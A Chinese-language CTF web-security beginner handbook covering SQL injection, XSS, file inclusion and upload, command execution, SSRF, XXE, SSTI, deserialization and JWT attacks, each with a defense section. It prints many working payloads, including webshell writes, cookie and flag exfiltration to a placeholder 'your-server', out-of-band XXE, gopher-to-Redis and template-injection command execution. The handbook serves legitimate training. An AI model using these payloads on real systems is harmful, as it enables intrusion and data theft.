---
title: "Web 安全入门"
description: "CTF Web 方向入门手册：HTTP 基础、SQL 注入、XSS、文件包含与上传、命令执行、SSRF、XXE、SSTI、反序列化、JWT 与逻辑漏洞。"
---

# Web 安全入门

> **从零开始，把 Web 题拆成可复用的套路**

Web 方向关注网站与 Web 应用中的安全问题，核心是理解数据从浏览器到服务端的完整流转过程。本文从 HTTP 基础讲到 SQL 注入、XSS、SSRF、SSTI、反序列化与认证绕过，并给出可复现的步骤。

## 第零章：开始之前

### 0.1 这篇手册适合谁

如果你会一点 HTML、能看懂简单的 PHP 或 Python，知道浏览器地址栏里的东西叫 URL，那就够了。Web 题不需要你先成为开发工程师，它更像“找茬”：**给你一个网站，找出它哪里没检查输入、哪里把用户当成了可信的人**。

### 0.2 只打授权目标

> ⚠️ **安全底线：** 本手册所有技术只能用于 CTF 比赛、自己搭建的靶场、明确授权的渗透测试。对真实站点使用这些技术，轻则违法，重则坐牢。不要“随手测一下”，不要扫别人家的站。

### 0.3 需要准备的东西

| 工具 | 用途 | 备注 |
|------|------|------|
| 浏览器 DevTools | 看源码、改请求、调试 JS | F12 打开 |
| Burp Suite Community | 抓包、改包、重放 | 免费版够用 |
| HackBar | 浏览器里快速发请求 | 很多题只需要它 |
| curl | 命令行发 HTTP 请求 | 写脚本时方便 |
| Python 3 | 写盲注、爆破脚本 | requests 库 |
| dirsearch / ffuf | 目录扫描 | 找隐藏路径 |
| sqlmap | SQL 注入自动化 | 先手注，再用它 |
| CyberChef | 编码解码 | 浏览器打开即可 |
| Docker | 本地起靶场 | 可选 |

### 0.4 本地靶场

先把环境跑起来，比看十篇文章有用：

- **DVWA**：最经典的漏洞练习站，覆盖 SQLi、XSS、文件包含、上传、命令执行。
- **sqli-labs**：专门练 SQL 注入，从 `?id=1` 到盲注、堆叠、WAF 绕过。
- **upload-labs**：专练文件上传绕过。
- **PortSwigger Web Security Academy**：免费、体系化、每个漏洞都有在线实验。
- **BUUCTF / CTFHub / NSSCTF**：国内 CTF 练习平台，Web 题量大。

### 0.5 一个正确的做题流程

```text
看题 → 访问站点 → 看源码/robots/备份 → 扫目录
     → 找输入点 → 判断漏洞类型 → 手工验证
     → 写脚本/用工具 → 拿 flag → 写 WP
```

> 💡 **新手最容易犯的错：** 一上来就 sqlmap 一把梭。题目往往有 WAF、过滤、自定义逻辑，工具跑不出来。先手工确认注入点、确认列数、确认回显位置，再用工具提速。

---

## 第一章：Web 基础速成

### 1.1 一个 HTTP 请求长什么样

```http
GET /index.php?id=1 HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=abc123
Accept: text/html
```

请求行由 **方法 + 路径 + 协议版本** 组成，下面是请求头，空行之后是请求体（POST 才有）。

常见方法：

| 方法 | 用途 |
|------|------|
| GET | 从 URL 取参数，参数在 `?` 后面 |
| POST | 表单/JSON 提交，参数在请求体 |
| PUT | 上传/覆盖资源 |
| DELETE | 删除资源 |
| HEAD | 只要响应头，不要响应体 |

### 1.2 常见状态码

| 状态码 | 含义 | CTF 里意味着什么 |
|--------|------|------------------|
| 200 | 成功 | 页面正常 |
| 301 / 302 | 重定向 | 可能绕过、可能跳登录 |
| 403 | 禁止访问 | 路径存在但没权限，值得继续挖 |
| 404 | 不存在 | 路径/文件猜错 |
| 500 | 服务器错误 | 参数可能触发了解析错误 |

> 💡 目录扫描时不要只看 200，`301`、`403` 往往说明“这个东西真的存在”。

### 1.3 Cookie、Session、JWT

- **Cookie**：浏览器保存的一小段键值，每次请求自动带上。
- **Session**：服务端保存的会话数据，Cookie 里通常只放一个 `sessionid`。
- **JWT**：把用户信息直接编码进 token，服务端验签，不查 session。

Web 题里遇到登录框，先看三件事：

1. 能不能弱口令/万能密码。
2. Cookie 里有没有可预测的字段（`user=guest`、`role=0`）。
3. 有没有 JWT，能不能改 `alg` 或 payload。

### 1.4 同源策略与 CORS

同源 = 协议 + 域名 + 端口完全相同。浏览器的同源策略限制 JS 读取其他源的响应，但**不限制发送请求**。

CORS 是服务端主动开的“跨域白名单”：

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

> ⚠️ `Allow-Origin: *` 和 `Allow-Credentials: true` 同时出现是错误配置；如果反射了请求的 `Origin`，就可能被任意站点读取数据。

### 1.5 常见指纹

| 特征 | 可能的技术栈 |
|------|--------------|
| `PHPSESSID` | PHP |
| `JSESSIONID` | Java |
| `ASP.NET_SessionId` | ASP.NET |
| `X-Powered-By: Express` | Node.js |
| `Server: nginx` | Nginx |
| `Server: Apache` | Apache |

看到技术栈，就能猜它可能有哪些“祖传漏洞”：PHP 的伪协议、Java 的反序列化、Node.js 的原型链污染。

---

## 第二章：信息收集

### 2.1 先看这三个地方

1. **页面源码**：注释里经常有 `<!-- TODO: 删除测试账号 -->`、隐藏表单、API 路径。
2. **`robots.txt`**：写着 `Disallow: /admin/`，等于告诉你哪里有东西。
3. **`/sitemap.xml`**：列出了站点所有公开页面。

### 2.2 备份文件与源码泄漏

CTF 里非常常见的“送分点”：

```text
/www.zip
/wwwroot.zip
/web.zip
/backup.zip
/site.tar.gz
/index.php.bak
/index.php~
/.index.php.swp
/.git/HEAD
/.svn/entries
/Dockerfile
/docker-compose.yml
/.env
```

> 💡 看到 `.git` 目录，直接用 `git-dumper http://target/.git/ out` 把整个仓库拉下来，然后 `git log`、`git diff` 找被删掉的 flag。

### 2.3 目录扫描

```bash
# dirsearch
python3 dirsearch.py -u http://target/ -e php,html,zip,bak

# ffuf
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
```

字典优先级：

1. 题目附件/源码里出现过的路径。
2. 常见备份名、编辑器临时文件。
3. 常见后台路径：`admin`、`login`、`api`、`upload`、`flag`。
4. 大字典（最后再用，避免把时间耗在扫目录上）。

### 2.4 指纹识别

```bash
whatweb http://target/
curl -I http://target/
```

看响应头、Cookie 名、报错页风格，基本能判断语言和框架。

---

## 第三章：SQL 注入

### 3.1 原理

后端把用户输入直接拼进 SQL：

```php
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

你输入 `1`，SQL 是 `WHERE id = 1`；你输入 `1 OR 1=1`，SQL 就变成 `WHERE id = 1 OR 1=1`，返回所有用户。

### 3.2 第一步：判断注入点

```sql
' 
"
')
1' AND '1'='1
1' AND '1'='2
1 AND 1=1
1 AND 1=2
```

如果 `1 AND 1=1` 正常、`1 AND 1=2` 异常，说明数字型注入；如果加引号报错，说明字符型注入。

注释符：

| 数据库 | 注释 |
|--------|------|
| MySQL | `-- `（后面必须有空格）、`#`、`/* */` |
| SQL Server | `--`、`/* */` |
| Oracle | `--` |
| SQLite | `--`、`/* */` |

### 3.3 UNION 注入

前提：页面有回显。

```sql
-- 1. 猜列数
1' ORDER BY 3 -- -
1' ORDER BY 4 -- -

-- 2. 找回显位
1' UNION SELECT 1,2,3 -- -

-- 3. 查库名、表名、列名
1' UNION SELECT 1,database(),3 -- -
1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -

-- 4. 拿数据
1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -
```

> 💡 `0x3a` 是冒号 `:` 的十六进制，用来把用户名和密码拼成 `admin:123456` 的形式。

### 3.4 报错注入

页面不回显数据，但会显示数据库报错：

```sql
1' AND extractvalue(1,concat(0x7e,(SELECT database()))) -- -
1' AND updatexml(1,concat(0x7e,(SELECT version())),1) -- -
```

`~` 是分隔符，方便在报错信息里定位结果。

### 3.5 盲注

页面只返回“真/假”或“正常/异常”，没有数据回显。

**布尔盲注：**

```sql
1' AND (SELECT substr(database(),1,1))='c' -- -
1' AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100 -- -
```

**时间盲注：**

```sql
1' AND IF(substr(database(),1,1)='c',sleep(2),0) -- -
```

Python 脚本骨架：

```python
import requests, string

url = "http://target/?id=1"
result = ""
for pos in range(1, 50):
    for ch in string.printable:
        payload = f"1' AND IF(substr(database(),{pos},1)='{ch}',sleep(1),0) -- -"
        try:
            requests.get(url, params={"id": payload}, timeout=0.6)
        except requests.Timeout:
            result += ch
            print(result)
            break
```

> 💡 时间盲注不要一次 sleep 太久，1 秒足够；请求要设置超时，否则脚本会卡死。

### 3.6 堆叠注入

```sql
1'; INSERT INTO users VALUES('hacker','123456'); -- -
1'; SELECT ...; -- -
```

能不能堆叠取决于数据库驱动：MySQL 的 `mysqli_query` 不支持多语句，PDO 默认也不支持；SQL Server 通常可以。

### 3.7 读写文件

```sql
-- 读文件（需要 FILE 权限，且 secure_file_priv 允许）
1' UNION SELECT 1,load_file('/flag'),3 -- -

-- 写 webshell（需要 FILE 权限 + 目录可写 + secure_file_priv 为空）
1' UNION SELECT 1,'<?php eval($_POST[1]);?>',3 INTO OUTFILE '/var/www/html/shell.php' -- -
```

> ⚠️ MySQL 8 默认 `secure_file_priv` 是空值以外的目录时，只能读写指定目录。遇到写不进去，先看这个配置。

### 3.8 sqlmap 快速用法

```bash
sqlmap -u "http://target/?id=1" --batch --dbs
sqlmap -u "http://target/?id=1" -D ctf -T flag --dump
sqlmap -u "http://target/" --data "username=admin&password=1" --batch --dbs
sqlmap -u "http://target/?id=1" --cookie "PHPSESSID=xxx" --batch --level 3
sqlmap -u "http://target/?id=1" --tamper=space2comment --batch
```

新手建议：先手工确认注入类型，再用 sqlmap；否则它会在错误的参数上浪费大量时间。

### 3.9 防御

- 预编译（PDO / PreparedStatement），不要拼接。
- 输入白名单（比如 `id` 只允许数字）。
- 数据库最小权限，关闭 `FILE`、禁用堆叠。
- 不要把原始报错返回给用户。

---

## 第四章：XSS 跨站脚本

### 4.1 三种类型

| 类型 | 特点 | 常见位置 |
|------|------|----------|
| 反射型 | 参数直接回显到页面 | 搜索框、错误页 |
| 存储型 | 内容存进数据库，别人访问时触发 | 留言板、评论、昵称 |
| DOM 型 | 前端 JS 把不可信数据写进 DOM | `innerHTML`、`location.hash` |

### 4.2 基础 payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<a href="javascript:alert(1)">click</a>
"><script>alert(document.cookie)</script>
```

### 4.3 常见绕过

| 过滤 | 绕过思路 |
|------|----------|
| 过滤 `<script>` | 换 `<img onerror>`、`<svg onload>` |
| 过滤 `alert` | 用 `confirm`、`prompt`、`console.log` |
| 过滤括号 | 用 `` alert`1` ``（模板字符串） |
| 转义引号 | 用反引号、`String.fromCharCode` |
| 小写过滤 | 大小写混合、HTML 实体编码 |
| 长度限制 | 外链 JS：`<script src=//x.js>` |

> 💡 现代浏览器默认拦截 `javascript:` 在部分上下文中的执行，CTF 里以题目环境为准。

### 4.4 DOM XSS

```javascript
// 危险写法
document.getElementById("x").innerHTML = location.hash.slice(1);
eval(location.search.slice(1));
document.write(decodeURIComponent(location.hash.slice(1)));
```

如果页面用 `innerHTML` 接收 `location.hash`，构造：

```text
http://target/#<img src=x onerror=alert(1)>
```

### 4.5 XSS 打管理员

CTF 里常见“提交链接给 bot，bot 带管理员 Cookie 访问”：

```javascript
// 把 cookie 外带到你的服务器
new Image().src = "http://your-server/?c=" + encodeURIComponent(document.cookie);
```

也可以用 DNSLog 平台确认触发（不需要公网服务器）。

### 4.6 CSP 基础

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP 限制页面能加载哪些脚本。遇到 CSP：

1. 看有没有 `unsafe-inline`、`unsafe-eval`。
2. 看有没有可用的 JSONP 端点或白名单 CDN。
3. 看 `base-uri`、`object-src` 是否缺失。

### 4.7 防御

- 输出编码：HTML 实体、属性编码、JS 编码，按上下文选择。
- 富文本用白名单过滤（DOMPurify）。
- 设置 `HttpOnly`，降低 Cookie 被窃取的风险。
- 配置 CSP。

---

## 第五章：文件包含

### 5.1 原理

```php
include($_GET['file']);
```

用户控制文件名，就能包含任意文件。分两种：

- **LFI（本地文件包含）**：包含服务器本地文件。
- **RFI（远程文件包含）**：包含远程 URL，需要 `allow_url_include=On`。

### 5.2 目录穿越

```text
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 5.3 PHP 伪协议

| 协议 | 作用 | 前提 |
|------|------|------|
| `php://filter` | 读取并编码文件 | 无 |
| `php://input` | 读取 POST 原始数据 | `allow_url_include=On` |
| `data://` | 直接嵌入数据 | `allow_url_include=On` |
| `phar://` | 触发 PHAR 反序列化 | 可包含 phar 文件 |
| `zip://` | 读取压缩包内文件 | 压缩包在服务器上 |
| `expect://` | 执行命令 | 安装 expect 扩展 |

**读源码（最常用）：**

```text
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=/flag
```

拿到 base64 后解码即可。注意 `read=` 可以省略，`convert.base64-encode` 是过滤器名。

**执行代码：**

```http
POST /?file=php://input
Content-Type: application/x-www-form-urlencoded

<?php system('id');?>
```

**data 协议：**

```text
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

（`PD9waHAgc3lzdGVtKCdpZCcpOz8+` 解码后是 `<?php system('id');?>`）

### 5.4 包含日志 / 临时文件

```text
?file=/var/log/apache2/access.log
?file=/var/log/nginx/access.log
?file=/proc/self/environ
?file=/tmp/sess_<PHPSESSID>
```

先把 PHP 代码写进 User-Agent 或 session，再包含日志/session 文件。

### 5.5 php://filter 链式 RCE

当只能包含、不能执行时，可以用 `convert.iconv` 过滤器链把任意文件内容“变形”成 PHP 代码：

```text
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|.../resource=/flag
```

手工构造很痛苦，直接用现成生成器：

```bash
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
```

### 5.6 防御

- 不要用用户输入拼路径。
- 白名单固定可包含的文件。
- `open_basedir` 限制目录。
- 关闭 `allow_url_include`。

---

## 第六章：文件上传

### 6.1 最基础的绕过

| 检查点 | 绕过方式 |
|--------|----------|
| 前端 JS 校验后缀 | Burp 改包，直接发 POST |
| `Content-Type` 校验 | 改成 `image/png` |
| 后缀黑名单 | 试 `php3`、`php5`、`phtml`、`pht`、`phar` |
| 后缀大小写 | `pHp`、`PHP` |
| 双写后缀 | `pphphp` |
| 路径截断 | `shell.php%00.jpg`（旧版本） |
| Windows 特性 | `shell.php.`、`shell.php::$DATA` |
| 文件头校验 | 在 PHP 代码前加 `GIF89a` |

### 6.2 .htaccess 与 .user.ini

Apache 允许上传 `.htaccess` 时：

```apache
AddType application/x-httpd-php .jpg
```

之后上传 `shell.jpg`，它会被当作 PHP 执行。

PHP-FPM/CGI 环境可以上传 `.user.ini`：

```ini
auto_prepend_file=shell.jpg
```

### 6.3 图片马 + 文件包含

```bash
copy /b normal.png + shell.php shell.png
```

图片本身不能执行，但配合 LFI 包含 `shell.png` 就能执行其中的 PHP 代码。

### 6.4 竞争上传

程序先保存文件、再检查后缀，检查失败就删除。利用“保存”到“删除”之间的时间窗访问文件：

```python
# 一边不断上传，一边不断请求
while True:
    requests.post(url, files={"file": ("shell.php", "<?php system($_GET[1]);?>")})
    requests.get("http://target/uploads/shell.php?1=id")
```

### 6.5 防御

- 后缀白名单（只允许 `jpg/png/gif`）。
- 重命名文件，不保留用户文件名。
- 上传目录禁止执行脚本。
- 用文件头 + 图像库二次渲染，去掉多余内容。
- 存储与 Web 根目录分离。

---

## 第七章：命令执行与代码执行

### 7.1 危险函数

| 函数 | 作用 |
|------|------|
| `system()` | 执行命令并输出 |
| `exec()` | 执行命令，返回最后一行 |
| `shell_exec()` | 执行命令，返回全部输出 |
| `passthru()` | 执行命令并原样输出 |
| `popen()` | 打开进程管道 |
| `proc_open()` | 更底层的进程控制 |
| 反引号 `` `cmd` `` | 等价于 `shell_exec` |

代码执行：

| 函数 | 说明 |
|------|------|
| `eval()` | 执行 PHP 代码 |
| `assert()` | PHP 8 起不再执行字符串 |
| `create_function()` | PHP 8 已移除 |
| `preg_replace()` /e | PHP 7 已移除 |
| `call_user_func()` | 回调可控时危险 |

### 7.2 命令拼接符

```bash
; id
| id
|| id
& id
&& id
$(id)
`id`
%0a id
```

### 7.3 空格与关键字绕过

```bash
cat${IFS}/flag
cat$IFS$9/flag
cat</flag
cat%09/flag
{cat,/flag}
c'a't /flag
ca\t /flag
/bin/ca? /flag
echo Y2F0IC9mbGFn | base64 -d | bash
```

### 7.4 读文件命令

```bash
cat /flag
tac /flag
nl /flag
more /flag
less /flag
head /flag
tail /flag
sort /flag
uniq /flag
od -c /flag
xxd /flag
base64 /flag
grep . /flag
awk '{print}' /flag
sed -n '1p' /flag
```

> 💡 过滤了 `cat` 就换 `tac`、`nl`、`sort`；过滤了空格就用 `${IFS}`；过滤了斜杠可以用环境变量或 `cd`。

### 7.5 外带数据

```bash
curl http://your-server/?d=$(cat /flag | base64 -w0)
wget http://your-server/$(cat /flag | base64 -w0)
ping $(cat /flag).your-dnslog.com
```

没有公网服务器时，用 DNSLog 平台确认命令执行。

### 7.6 disable_functions 绕过（了解）

常见思路：

- `LD_PRELOAD` + `putenv` + 外部程序。
- `mail()` / `imap_open()` 调用外部命令。
- PHP-FPM 未授权访问。
- `Apache mod_cgi`。
- `chankro` 等现成工具。

新手阶段不用死磕，先确认 `disable_functions` 到底禁了什么：

```php
var_dump(ini_get('disable_functions'));
```

### 7.7 防御

- 不拼接用户输入到命令。
- 用参数化 API（如 `escapeshellarg`）。
- 白名单允许的命令和参数。
- 禁用不必要的函数，降低 Web 进程权限。

---

## 第八章：SSRF 服务端请求伪造

### 8.1 原理

服务端根据用户提供的 URL 去请求资源，比如“图片转存”“URL 预览”“Webhook 测试”。如果不过滤，就能让服务器替你去访问内网。

### 8.2 常见入口

```text
?url=http://...
?image=http://...
?webhook=http://...
?proxy=http://...
```

### 8.3 内网地址写法

```text
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://2130706433/       # 127.0.0.1 的十进制
http://0x7f000001/       # 十六进制
http://0177.0.0.1/       # 八进制
http://127.1/
```

### 8.4 协议利用

| 协议 | 用途 |
|------|------|
| `file://` | 读本地文件 |
| `dict://` | 探测端口、与 Redis 等交互 |
| `gopher://` | 构造任意 TCP 数据包 |
| `http://` | 访问内网 Web |

**gopher 打 Redis 写 shell：**

```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
```

把 Redis 命令按 RESP 协议 URL 编码，就能在 Redis 上执行 `set`、`config set dir`、`save` 等操作。

### 8.5 云元数据

| 云 | 地址 |
|----|------|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` |
| GCP | `http://metadata.google.internal/`（需要 `Metadata-Flavor: Google`） |

### 8.6 绕过技巧

- `302` 跳转：你的服务器返回 302 到 `127.0.0.1`。
- DNS Rebinding：域名第一次解析到公网，第二次解析到内网。
- 短链接、URL 解析差异（`@`、`#`、编码）。
- 只校验字符串前缀时，用 `http://127.0.0.1@evil.com` 之类混淆。

### 8.7 防御

- 协议白名单（只允许 http/https）。
- 解析 DNS 后校验 IP，禁止私网、回环、链路本地地址。
- 禁止跟随重定向，或每次跳转都重新校验。
- 出网走统一代理。

---

## 第九章：XXE 外部实体注入

### 9.1 原理

XML 解析器支持外部实体：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

`&xxe;` 会被替换成 `/etc/passwd` 的内容。

### 9.2 有回显

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>&xxe;</root>
```

### 9.3 无回显（OOB）

把文件内容通过外部 DTD 发到你的服务器：

**evil.dtd：**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://your-server/?%file;'>">
%all;
```

**请求：**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://your-server/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

### 9.4 常见入口

- 登录/搜索接口接收 XML。
- 文件上传 `.docx`、`.xlsx`、`.svg`（本质都是 XML）。
- SOAP 接口。
- `Content-Type: application/xml` 的 POST 请求。

### 9.5 防御

- 禁用外部实体（PHP：`libxml_disable_entity_loader(true)`，PHP 8 默认禁用）。
- 使用安全的 XML 解析器配置。
- 不解析不可信 XML，或改用 JSON。

---

## 第十章：SSTI 模板注入

### 10.1 探测

不同模板引擎的语法：

| 引擎 | 测试 payload | 7×7 结果 |
|------|--------------|----------|
| Jinja2（Python） | <code v-pre>{{7*7}}</code> | 49 |
| Twig（PHP） | <code v-pre>{{7*7}}</code> | 49 |
| Freemarker（Java） | `${7*7}` | 49 |
| Velocity（Java） | `#{7*7}` | 49 |
| ERB（Ruby） | `<%= 7*7 %>` | 49 |

区分 Jinja2 和 Twig：

```text
{{7*'7'}}
```

Jinja2 返回 `7777777`（字符串重复），Twig 返回 `49`。

### 10.2 Jinja2 利用

```python
{{config}}                     # Flask 配置，可能泄露 SECRET_KEY
{{self}}                       # 模板对象
{{lipsum.__globals__}}         # 全局变量
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

找 `os` 模块的通用链：

```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

在返回的类列表里找 `subprocess.Popen`、`os._wrap_close` 等。

### 10.3 过滤绕过

| 过滤 | 绕过 |
|------|------|
| 过滤 `.` | <code v-pre>{{lipsum['&#95;&#95;globals&#95;&#95;']}}</code> |
| 过滤 `_` | <code v-pre>{{request['&#95;&#95;class&#95;&#95;']}}</code> 或十六进制 |
| 过滤 `[]` | <code v-pre>{{lipsum.&#95;&#95;globals&#95;&#95;.get('os')}}</code> |
| 过滤关键字 | <code v-pre>{{lipsum&#124;attr('&#95;&#95;globals&#95;&#95;')}}</code> |
| 过滤引号 | 用 `request.args` 传参 |

### 10.4 其他引擎

**Freemarker：**

```text
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

**Twig（旧版本）：**

```text
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### 10.5 防御

- 不要把用户输入拼进模板。
- 用 `render_template` 传变量，而不是 `render_template_string`。
- 开启模板沙箱，限制危险对象。

---

## 第十一章：反序列化

### 11.1 PHP 反序列化

```php
class User {
    public $name;
    function __destruct() {
        system($this->name);
    }
}

echo serialize(new User());
// O:4:"User":1:{s:4:"name";s:2:"id";}
```

把 `name` 改成 `cat /flag`，再让服务端 `unserialize`，`__destruct` 就会执行。

常见魔术方法：

| 方法 | 触发时机 |
|------|----------|
| `__construct` | 创建对象 |
| `__destruct` | 对象销毁 |
| `__wakeup` | `unserialize` 时 |
| `__toString` | 对象被当字符串 |
| `__call` | 调用不存在的方法 |
| `__get` | 读取不存在的属性 |
| `__set` | 写入不存在的属性 |
| `__invoke` | 对象被当函数调用 |

**POP 链**就是把多个类的魔术方法串起来，从“可控属性”走到“危险函数”。现成链可以用 `phpggc` 生成：

```bash
phpggc Laravel/RCE1 system 'id'
```

### 11.2 Java 反序列化

Java 的 `ObjectInputStream.readObject()` 会触发 `readObject`，配合 CommonsCollections 等库可以 RCE。

```bash
java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin
```

探测是否存在反序列化点，可以先用 `URLDNS`（不依赖 gadget，能触发 DNS 请求）：

```bash
java -jar ysoserial.jar URLDNS http://xxx.dnslog.cn > payload.bin
```

### 11.3 Python pickle

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
```

`pickle.loads` 会执行 `__reduce__` 返回的函数。

### 11.4 Node.js 原型链污染

```javascript
// 合并对象时污染原型
Object.assign({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
```

常见于 `lodash.merge`、`Object.assign`、自定义深拷贝。

### 11.5 防御

- 不反序列化不可信数据。
- 使用 JSON 等纯数据格式。
- 反序列化前做签名校验。
- 白名单允许的类。

---

## 第十二章：JWT 与身份认证

### 12.1 结构

JWT 由三段组成，用 `.` 分隔：

```text
header.payload.signature
```

```json
// header
{"alg":"HS256","typ":"JWT"}

// payload
{"user":"guest","role":"user"}

// signature
HMACSHA256(base64url(header) + "." + base64url(payload), secret)
```

base64url 与普通 base64 的区别：`+` 换 `-`，`/` 换 `_`，去掉 `=` 填充。

### 12.2 alg:none

把 header 改成：

```json
{"alg":"none","typ":"JWT"}
```

签名留空（保留最后的点）。如果服务端信任 `alg` 字段，就会接受未签名的 token。

```bash
python3 jwt_tool.py <token> -X a
```

### 12.3 HS256 / RS256 算法混淆

服务端本来用 RS256（私钥签名、公钥验签），但如果你把 `alg` 改成 HS256，某些库会用“公钥”当 HMAC 密钥来验签。公钥是公开的，你就能自己签名。

```bash
python3 jwt_tool.py <token> -X k -pk public.pem
```

### 12.4 弱密钥爆破

```bash
hashcat -m 16500 jwt.txt wordlist.txt
```

### 12.5 其他问题

| 问题 | 说明 |
|------|------|
| `kid` 注入 | `kid` 拼进文件路径/SQL，可路径穿越或注入 |
| `jku` / `x5u` | 指向攻击者的 JWKS，服务端去拉取 |
| 过期校验缺失 | `exp` 不校验，token 永久有效 |
| 敏感信息 | payload 只是 base64，不是加密 |

### 12.6 防御

- 服务端固定算法，拒绝 `none`。
- 使用强随机密钥。
- 校验 `exp`、`nbf`、`iss`、`aud`。
- 不要把密钥、密码放进 payload。

---

## 第十三章：逻辑漏洞与越权

### 13.1 越权

- **水平越权**：普通用户 A 能看用户 B 的订单。
- **垂直越权**：普通用户能进管理员后台。

测试方法：

```text
/order?id=1001  →  /order?id=1002
/user/1001      →  /user/1002
/admin          →  普通用户直接访问
```

改 Cookie、改 JWT payload、改隐藏字段 `role=user` → `role=admin`。

### 13.2 支付逻辑

```text
price=100  →  price=0.01
quantity=1 →  quantity=-1
coupon=ONCE → 重复使用
```

### 13.3 验证码

- 验证码不刷新，可复用。
- 验证码只在前端校验。
- 验证码可爆破（4 位纯数字）。
- 验证码与手机号不绑定。

### 13.4 密码重置

- 重置 token 可预测。
- token 不绑定用户。
- 重置链接可被 Host 头污染。
- 响应里直接返回新密码。

### 13.5 条件竞争

先判断余额、再扣款，中间有时间窗。并发请求可能让同一笔钱被多次使用。

```python
import threading
for _ in range(50):
    threading.Thread(target=requests.post, args=(url,)).start()
```

### 13.6 防御

- 所有权限判断放在服务端。
- 每个请求都校验资源归属。
- 金额、数量做范围校验。
- 关键操作加锁/事务/幂等。

---

## 第十四章：CTF 常见骚操作

### 14.1 PHP 弱比较

```php
if ($_GET['a'] == $_GET['b']) { ... }
```

PHP 7 中 `"0e123" == "0e456"` 为真（都当 0）。常用 magic hash：

```text
md5('240610708') = 0e462097431906509019562988736854
md5('QNKCDZO')   = 0e830400451993494058024219903391
```

> ⚠️ PHP 8 收紧了字符串比较，但两个纯数字字符串（如 `0e...`）仍然按数值比较。遇到老题先看版本。

### 14.2 md5 碰撞

```text
?md5=QNKCDZO
```

如果题目要求 `md5($a) == md5($b)` 且 `$a != $b`，可以用已知碰撞对（fastcoll 生成），或者数组绕过（老版本）。

### 14.3 数组绕过

```php
md5($_GET['a']) === md5($_GET['b'])
```

传 `?a[]=1&b[]=2`，`md5()` 收到数组返回 `null`，两个 `null` 相等。PHP 8 会抛 `TypeError`，老题才有效。

### 14.4 strcmp 绕过

```php
if (strcmp($_GET['a'], $flag) == 0)
```

传 `?a[]=1`，`strcmp` 收到数组返回 `null`，`null == 0` 为真。PHP 8 同样会报错。

### 14.5 变量覆盖

```php
extract($_GET);
parse_str($_GET['data']);
$$key = $value;
```

如果 `$flag` 被覆盖，可能直接输出。

### 14.6 伪协议组合

```text
?file=php://filter/convert.base64-encode/resource=flag.php
?file=phar://upload/1.phar/shell.php
?file=zip://upload/1.zip%23shell.php
```

### 14.7 源码泄漏

```text
/index.php~          # vim 备份
/index.php.swp       # vim 交换文件
/index.php.bak
/.index.php.swp
/www.zip
```

### 14.8 常见 CTF 关键字

| 关键字 | 可能漏洞 |
|--------|----------|
| `include` / `require` | 文件包含 |
| `unserialize` | 反序列化 |
| `eval` / `assert` | 代码执行 |
| `system` / `exec` | 命令执行 |
| `file_get_contents` | SSRF/文件读取 |
| `simplexml_load_string` | XXE |
| `render_template_string` | SSTI |
| `jsonwebtoken` | JWT |

---

## 第十五章：工具链与学习路线

### 15.1 工具速查

| 场景 | 工具 |
|------|------|
| 抓包改包 | Burp Suite、Yakit |
| 目录扫描 | dirsearch、ffuf、feroxbuster |
| SQL 注入 | sqlmap、自己写脚本 |
| XSS | BeEF（了解）、手工 |
| 反序列化 | ysoserial、phpggc |
| JWT | jwt_tool、hashcat |
| 编码 | CyberChef |
| 指纹 | whatweb、Wappalyzer |
| 漏洞扫描 | nuclei（授权目标） |

### 15.2 学习路线

```text
HTML/JS/PHP 基础
   ↓
HTTP 与 Burp 抓包
   ↓
SQL 注入 → XSS → 文件包含 → 文件上传
   ↓
命令执行 → SSRF → XXE → SSTI
   ↓
反序列化 → JWT → 逻辑漏洞
   ↓
代码审计 → 组合利用 → 真实靶场
```

### 15.3 推荐靶场与资料

- **PortSwigger Web Security Academy**：免费，按漏洞分类，有在线实验。
- **DVWA**：本地 Docker 一键起。
- **sqli-labs**：SQL 注入专项。
- **upload-labs**：上传绕过专项。
- **BUUCTF / CTFHub / NSSCTF**：国内题。
- **OWASP Top 10:2025**：了解真实世界的风险分类。
- **CTF Wiki Web 篇**：中文系统资料。

### 15.4 WP 模板

```markdown
## 题目信息
- 名称：
